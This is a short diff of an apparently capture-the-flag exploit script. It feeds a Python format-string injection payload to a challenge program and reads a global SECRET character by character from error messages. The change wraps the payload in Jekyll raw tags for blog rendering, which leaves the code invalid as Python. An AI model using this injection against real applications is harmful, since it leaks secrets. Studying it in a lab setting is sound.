@@ -76,8 +76,14 @@ while True:
         stderr=subprocess.STDOUT
     )
 
-    payload = f"{{ self.ask_age.__globals__[SECRET][{ i }] }}\n"
-    inp = b"1\n" + payload.encode()
+    # NOTE:
+# GitHub Pages uses the Liquid template engine, which interprets {{ ... }} as a template variable.
+# Because this payload intentionally contains {{ }} as part of the exploit,
+# we wrap it in `{% raw %}` blocks so Jekyll will render it literally
+# instead of trying to parse it.
+    {% raw %}
+    payload = f"{{ self.ask_age.__globals__[SECRET][{ i }] }}\n"
+    {% endraw %}    inp = b"1\n" + payload.encode()
     out, _ = p.communicate(inp)
 
     m = re.search(br"Unknown format code '(.)'", out)
